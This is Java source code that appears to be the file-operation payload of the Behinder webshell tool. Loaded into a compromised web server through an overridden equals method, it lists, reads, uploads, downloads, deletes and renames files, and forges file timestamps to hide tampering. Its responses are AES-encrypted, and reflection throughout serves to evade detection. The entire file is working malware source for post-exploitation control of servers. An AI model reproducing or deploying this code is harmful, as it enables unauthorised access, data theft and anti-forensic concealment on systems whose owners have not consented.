package net.rebeyond.behinder.payload.java;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.nio.charset.Charset;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class FileOperation {
    public static String accessTimeStamp;
    public static String charset;
    public static String content;
    public static String createTimeStamp;
    public static String mode;
    public static String modifyTimeStamp;
    public static String newPath;
    public static String path;
    private Object Request;
    private Object Response;
    private Object Session;
    private Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));

    public boolean equals(Object obj) {
        Map<String, String> result = new HashMap<>();
        try {
            fillContext(obj);
            if (mode.equalsIgnoreCase("list")) {
                result.put("msg", list());
                result.put("status", "success");
            } else if (mode.equalsIgnoreCase("show")) {
                result.put("msg", show());
                result.put("status", "success");
            } else if (mode.equalsIgnoreCase("delete")) {
                result = delete();
            } else if (mode.equalsIgnoreCase("create")) {
                result.put("msg", create());
                result.put("status", "success");
            } else if (mode.equalsIgnoreCase("append")) {
                result.put("msg", append());
                result.put("status", "success");
            } else if (mode.equalsIgnoreCase("download")) {
                download();
                try {
                    Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    so.getClass().getMethod("write", byte[].class).invoke(so, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                    so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                    so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                } catch (Exception e) {
                }
                return true;
            } else if (mode.equalsIgnoreCase("rename")) {
                result = renameFile();
            } else if (mode.equalsIgnoreCase("createFile")) {
                result.put("msg", createFile());
                result.put("status", "success");
            } else if (mode.equalsIgnoreCase("createDirectory")) {
                result.put("msg", createDirectory());
                result.put("status", "success");
            } else if (mode.equalsIgnoreCase("getTimeStamp")) {
                result.put("msg", getTimeStamp());
                result.put("status", "success");
            } else if (mode.equalsIgnoreCase("updateTimeStamp")) {
                result.put("msg", updateTimeStamp());
                result.put("status", "success");
            }
            try {
                Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so2.getClass().getMethod("write", byte[].class).invoke(so2, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
            } catch (Exception e2) {
            }
        } catch (Exception e3) {
            result.put("msg", e3.getMessage());
            result.put("status", "fail");
            try {
                Object so3 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so3.getClass().getMethod("write", byte[].class).invoke(so3, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so3.getClass().getMethod("flush", new Class[0]).invoke(so3, new Object[0]);
                so3.getClass().getMethod("close", new Class[0]).invoke(so3, new Object[0]);
            } catch (Exception e4) {
            }
        } catch (Throwable th) {
            try {
                Object so4 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so4.getClass().getMethod("write", byte[].class).invoke(so4, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so4.getClass().getMethod("flush", new Class[0]).invoke(so4, new Object[0]);
                so4.getClass().getMethod("close", new Class[0]).invoke(so4, new Object[0]);
            } catch (Exception e5) {
            }
            throw th;
        }
        return true;
    }

    private Map<String, String> warpFileObj(File file) {
        Map<String, String> obj = new HashMap<>();
        obj.put("type", file.isDirectory() ? "directory" : "file");
        obj.put("name", file.getName());
        obj.put("size", file.length() + "");
        obj.put("perm", getFilePerm(file));
        obj.put("lastModified", new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date(file.lastModified())));
        return obj;
    }

    private boolean isOldJava() {
        if (System.getProperty("java.version").compareTo("1.7") >= 0) {
            return false;
        }
        return true;
    }

    private String getFilePerm(File file) {
        String str;
        String str2;
        String str3;
        if (isWindows()) {
            StringBuilder sb = new StringBuilder();
            if (file.canRead()) {
                str = "R";
            } else {
                str = "-";
            }
            StringBuilder append = sb.append(str).append("/");
            if (file.canWrite()) {
                str2 = "W";
            } else {
                str2 = "-";
            }
            StringBuilder append2 = append.append(str2).append("/");
            if (file.canExecute()) {
                str3 = "E";
            } else {
                str3 = "-";
            }
            return append2.append(str3).toString();
        } else if (System.getProperty("java.version").compareTo("1.7") >= 0) {
            try {
                getClass();
                Class FilesCls = Class.forName("java.nio.file.Files");
                getClass();
                Class PosixFileAttributesCls = Class.forName("java.nio.file.attribute.PosixFileAttributes");
                getClass();
                Class PathsCls = Class.forName("java.nio.file.Paths");
                getClass();
                Class PosixFilePermissionsCls = Class.forName("java.nio.file.attribute.PosixFilePermissions");
                return PosixFilePermissionsCls.getMethod("toString", Set.class).invoke(PosixFilePermissionsCls, PosixFileAttributesCls.getMethod("permissions", new Class[0]).invoke(FilesCls.getMethod("readAttributes", Path.class, Class.class, LinkOption[].class).invoke(FilesCls, PathsCls.getMethod("get", String.class, String[].class).invoke(PathsCls.getClass(), file.getAbsolutePath(), new String[0]), PosixFileAttributesCls, new LinkOption[0]), new Object[0])).toString();
            } catch (Exception e) {
                return "";
            }
        } else {
            return (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/" + (file.canExecute() ? "E" : "-");
        }
    }

    private String list() throws Exception {
        File f = new File(path);
        List<Map<String, String>> objArr = new ArrayList<>();
        objArr.add(warpFileObj(new File(".")));
        objArr.add(warpFileObj(new File("src/main")));
        if (f.isDirectory() && f.listFiles() != null) {
            for (File temp : f.listFiles()) {
                objArr.add(warpFileObj(temp));
            }
        }
        return buildJsonArray(objArr, true);
    }

    private String show() throws Exception {
        if (charset == null) {
            charset = System.getProperty("file.encoding");
        }
        StringBuffer sb = new StringBuffer();
        File f = new File(path);
        if (f.exists() && f.isFile()) {
            InputStreamReader isr = new InputStreamReader(new FileInputStream(f), charset);
            BufferedReader br = new BufferedReader(isr);
            while (true) {
                String str = br.readLine();
                if (str == null) {
                    break;
                }
                sb.append(str + "\n");
            }
            br.close();
            isr.close();
        }
        return sb.toString();
    }

    private String create() throws Exception {
        FileOutputStream fso = new FileOutputStream(path);
        fso.write(base64decode(content));
        fso.flush();
        fso.close();
        return path + "上传完成，远程文件大小:" + new File(path).length();
    }

    private Map<String, String> renameFile() throws Exception {
        Map<String, String> result = new HashMap<>();
        File oldFile = new File(path);
        File newFile = new File(newPath);
        if (!oldFile.exists() || (!oldFile.isFile() || !oldFile.renameTo(newFile))) {
            result.put("status", "fail");
            result.put("msg", "重命名失败:" + newPath);
        } else {
            result.put("status", "success");
            result.put("msg", "重命名完成:" + newPath);
        }
        return result;
    }

    private String createFile() throws Exception {
        new FileOutputStream(path).close();
        return path + "创建完成";
    }

    private String createDirectory() throws Exception {
        new File(path).mkdirs();
        return path + "创建完成";
    }

    private void download() throws Exception {
        FileInputStream fis = new FileInputStream(path);
        byte[] buffer = new byte[1024000];
        Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
        Method write = so.getClass().getMethod("write", byte[].class);
        while (true) {
            int length = fis.read(buffer);
            if (length > 0) {
                write.invoke(so, Arrays.copyOfRange(buffer, 0, length));
            } else {
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                fis.close();
                return;
            }
        }
    }

    private String append() throws Exception {
        FileOutputStream fso = new FileOutputStream(path, true);
        fso.write(base64decode(content));
        fso.flush();
        fso.close();
        return path + "追加完成，远程文件大小:" + new File(path).length();
    }

    private Map<String, String> delete() throws Exception {
        Map<String, String> result = new HashMap<>();
        File f = new File(path);
        if (!f.exists()) {
            result.put("status", "fail");
            result.put("msg", "文件不存在.");
        } else if (f.delete()) {
            result.put("status", "success");
            result.put("msg", path + " 删除成功.");
        } else {
            result.put("status", "fail");
            result.put("msg", "文件" + path + "存在，但是删除失败.");
        }
        return result;
    }

    private String getTimeStamp() throws Exception {
        DateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
        File f = new File(path);
        Map<String, String> timeStampObj = new HashMap<>();
        if (f.exists()) {
            getClass();
            Class FilesCls = Class.forName("java.nio.file.Files");
            getClass();
            Class BasicFileAttributesCls = Class.forName("java.nio.file.attribute.BasicFileAttributes");
            getClass();
            Class PathsCls = Class.forName("java.nio.file.Paths");
            Object file = PathsCls.getMethod("get", String.class, String[].class).invoke(PathsCls.getClass(), path, new String[0]);
            Object attrs = FilesCls.getMethod("readAttributes", Path.class, Class.class, LinkOption[].class).invoke(FilesCls, file, BasicFileAttributesCls, new LinkOption[0]);
            Class FileTimeCls = Class.forName("java.nio.file.attribute.FileTime");
            Object createTime = FileTimeCls.getMethod("toMillis", new Class[0]).invoke(BasicFileAttributesCls.getMethod("creationTime", new Class[0]).invoke(attrs, new Object[0]), new Object[0]);
            Object lastAccessTime = FileTimeCls.getMethod("toMillis", new Class[0]).invoke(BasicFileAttributesCls.getMethod("lastAccessTime", new Class[0]).invoke(attrs, new Object[0]), new Object[0]);
            Object lastModifiedTime = FileTimeCls.getMethod("toMillis", new Class[0]).invoke(BasicFileAttributesCls.getMethod("lastModifiedTime", new Class[0]).invoke(attrs, new Object[0]), new Object[0]);
            String createTimeStamp2 = df.format(new Date(((Long) createTime).longValue()));
            String lastAccessTimeStamp = df.format(new Date(((Long) lastAccessTime).longValue()));
            String lastModifiedTimeStamp = df.format(new Date(((Long) lastModifiedTime).longValue()));
            timeStampObj.put("createTime", createTimeStamp2);
            timeStampObj.put("lastAccessTime", lastAccessTimeStamp);
            timeStampObj.put("lastModifiedTime", lastModifiedTimeStamp);
            return buildJson(timeStampObj, true);
        }
        throw new Exception("文件不存在");
    }

    private boolean isWindows() {
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
            return true;
        }
        return false;
    }

    private String updateTimeStamp() throws Exception {
        DateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
        File f = new File(path);
        if (f.exists()) {
            f.setLastModified(df.parse(modifyTimeStamp).getTime());
            if (isOldJava()) {
                return "时间戳修改成功。";
            }
            Class PathsCls = Class.forName("java.nio.file.Paths");
            Class BasicFileAttributeViewCls = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
            Class FileTimeCls = Class.forName("java.nio.file.attribute.FileTime");
            Object attributes = Class.forName("java.nio.file.Files").getMethod("getFileAttributeView", Path.class, Class.class, LinkOption[].class).invoke(Class.forName("java.nio.file.Files"), PathsCls.getMethod("get", String.class, String[].class).invoke(PathsCls.getClass(), path, new String[0]), BasicFileAttributeViewCls, new LinkOption[0]);
            Object createTime = FileTimeCls.getMethod("fromMillis", Long.TYPE).invoke(FileTimeCls, Long.valueOf(df.parse(createTimeStamp).getTime()));
            Object accessTime = FileTimeCls.getMethod("fromMillis", Long.TYPE).invoke(FileTimeCls, Long.valueOf(df.parse(accessTimeStamp).getTime()));
            Object modifyTime = FileTimeCls.getMethod("fromMillis", Long.TYPE).invoke(FileTimeCls, Long.valueOf(df.parse(modifyTimeStamp).getTime()));
            BasicFileAttributeViewCls.getMethod("setTimes", FileTimeCls, FileTimeCls, FileTimeCls).invoke(attributes, modifyTime, accessTime, createTime);
            return "时间戳修改成功。";
        }
        throw new Exception("文件不存在");
    }

    private String buildJsonArray(List<Map<String, String>> list, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("[");
        Iterator<Map<String, String>> it = list.iterator();
        while (it.hasNext()) {
            sb.append(buildJson(it.next(), encode) + ",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("]");
        return sb.toString();
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                } else {
                    getClass();
                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes("UTF-8"))).replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        SecretKeySpec skeySpec = new SecretKeySpec(this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString().getBytes("utf-8"), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }

    private byte[] base64decode(String base64Text) throws Exception {
        if (System.getProperty("java.version").compareTo("1.9") >= 0) {
            getClass();
            Class Base64 = Class.forName("java.util.Base64");
            Object Decoder = Base64.getMethod("getDecoder", null).invoke(Base64, null);
            return (byte[]) Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
        }
        getClass();
        Object Decoder2 = Class.forName("sun.misc.BASE64Decoder").newInstance();
        return (byte[]) Decoder2.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder2, base64Text);
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map<String, Object> objMap = (Map) obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }
}
